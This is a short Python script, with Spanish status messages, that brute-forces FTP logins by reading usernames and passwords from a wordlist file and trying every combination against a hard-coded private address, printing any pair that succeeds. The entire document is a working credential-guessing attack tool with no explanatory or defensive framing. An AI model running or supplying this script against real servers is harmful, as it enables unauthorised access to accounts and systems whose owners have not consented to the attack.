#/usr/bin/env python
#_*_ coding: utf-8 _*_

import ftplib


def brute(ip, usuario, password):
	ftp = ftplib.FTP(ip)

	try: 
		ftp.login(usuario, password)
		ftp.quit()
		print('User: {} : {} '.format(usuario, password))
	except: 
		print("Fallo la autenticacion")

def main():
	ip = '192.168.8.6'
	usuarios = open('users_password.txt','r')
	usuarios = usuarios.read().split('\n')
	passwords = open('users_password.txt','r')
	passwords = passwords.read().split('\n')

	for usuario in usuarios: 
		for p in passwords: 
			brute(ip, usuario, p)


if __name__ == '__main__':
	try: 
		main()
	except KeyboardInterrupt: 
		exit() 

